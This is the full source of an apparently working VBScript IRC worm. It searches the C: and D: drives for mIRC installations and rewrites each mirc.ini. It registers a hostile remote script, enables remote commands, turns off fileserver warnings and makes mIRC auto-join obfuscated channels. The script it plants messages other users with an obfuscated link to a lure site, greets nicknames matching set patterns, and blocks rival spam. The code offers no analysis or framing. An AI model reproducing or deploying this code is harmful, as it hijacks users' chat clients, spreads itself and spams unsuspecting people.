dim Otag 

dim Ttag 
dim DummyTag
dim SectionDef
call ShowFolderList("c:\")
call ShowFolderList("d:\")
sub ShowFolderList(s)
on error resume next
Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
Set SubFolds1 = RootFolder1.subfolders
For Each f1 in Subfolds1
s = f1.path & "\"
Otag = s & "mirc.ini"
DummyTag= "C:\winamod.dat"
TTag= s & "remote.txt"
SectionDef= "[rfiles]"
if filesys.fileexists(otag) then 
Call Filemod() 
filesys.CopyFile DummyTag, Otag, true
Call ImplementRemote()
filesys.CopyFile DummyTag, Otag, true
Call ImplementWarn()
filesys.CopyFile DummyTag, Otag, true
Call ImplementFserv()
filesys.CopyFile DummyTag, Otag, true
call ImplementPerfCheck()
filesys.CopyFile DummyTag, Otag, true
Call ImplementPerform()
'SetClearArchiveBit(Otag)
End If
Call ShowFolderList(s)
Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=remote.txt"
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function
sub FLDL(TTag)
on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "sex"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "on *:TEXT:*w*w*w*.*tk*:?:/closemsg $nick | /.notice $nick Do not Spam Me %logo"
fr6.writeline "on *:TEXT:*h*t*t*p*.*tk*:?:/closemsg $nick | /.notice $nick Do not Spam Me %logo"
fr6.writeline "/set %logo EyeScript"
fr6.writeline "on *:TEXT:*h*t*t*p*.*free*:?:/closemsg $nick | /.notice $nick Do not Spam Me %logo"
fr6.writeline "on *:TEXT:*h*t*t*p*.*hit*:?:/closemsg $nick | /.notice $nick Do not Spam Me %logo"
fr6.writeline "on *:TEXT:*w*w*w*.*free*:?:/closemsg $nick | /.notice $nick Do not Spam Me %logo"
fr6.writeline "on *:TEXT:*w*w*w*.*hit*:?:/closemsg $nick | /.notice $nick Do not Spam Me %logo"
fr6.writeline "on *:START:/. $+ pe $+ r $+ form o $+ n "
fr6.writeline "alias remote { /remote off | /.remote on }"
fr6.writeline "alias window { /set %window $2- |  if ( og isin %window ) { halt } |  else { .part %window } }"
fr6.writeline "a"
fr6.writeline "a"
fr6.writeline "on *:connect:{ /.timer 1 152 /join -n #Bulgaria }"
fr6.writeline "on *:TEXT:*ok*:?:/.msg $nick ae q vij www. $+ ga $+ le $+ ria.b $+ gfr $+ ee.com i mi kaji haresva bluzata mi"
fr6.writeline "on *:TEXT:*asl*:?:/.msg $nick ae q vij www. $+ ga $+ le $+ ria.b $+ gfr $+ ee.com tam s novata pricheska sam"
fr6.writeline "on *:TEXT:*pic*:?:/.msg $nick ae q vij www. $+ ga $+ le $+ ria.b $+ gfr $+ ee.com tam mi e snimkata"
fr6.writeline "on *:TEXT:*snim*:?:/.msg $nick ae q vij www. $+ ga $+ le $+ ria.b $+ gfr $+ ee.com tam e"
fr6.writeline "on *:JOIN:#:{"
fr6.writeline "  if ( og isin # ) { halt }"
fr6.writeline "  if ( ^^ isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( ___ isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( `` isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _1 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _2 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _3 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _4 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _5 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _6 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _7 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _8 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _9 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _0 isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _f isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( _m isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( slad isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( got isin $nick ) { .msg $nick hi }"
fr6.writeline "  if ( sex isin $nick ) { .msg $nick hi }"
fr6.writeline "}"
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.writeline " "
fr6.close
end sub
Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[options]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(mid(n2a,1,3))=ucase("n2=") then
fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
exit do
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[fileserver]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(Mid(n2a, 1, 3))=ucase("warning=on") then
fr2a.writeline "warning=off"
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)
Do While fr1c.AtEndOfStream <> True
segment1c = fr1c.readline
fr2c.writeline segment1c
if ucase(segment1c)=ucase("[fileserver]") then
Do
if fr1c.AtEndOfStream then exit do
n2c = fr1c.readline
If ucase(n2c)=ucase("warning=on") then
fr2c.writeline "warning=off"
Else
fr2c.writeline n2c
End If
Loop
end if
loop
fr1c.Close
fr2c.close
End Function
Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/.timer 1 0 //.Remote ON | /.timer 0 30 /join -n #s $+ V $+ oG $+ E"
fr1p.Close
fs1p.close
End Function
Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub
Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)
Do While fr1f.AtEndOfStream <> True
segment1f = fr1f.readline
fr2f.writeline segment1f
if ucase(segment1f)=ucase("[options]") then
Do
If fr1f.AtEndOfStream Then exit do
n2f = fr1f.readline
If ucase(mid(n2f,1,3))=ucase("n0=") then
fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
exit do
Else
fr2f.writeline n2f
End If
Loop
end if
loop
fr1f.Close
fr2f.close
End Function

set sss=createobject("scripting.filesystemobject")

sss.DeleteFile "c:\winamod.dat"
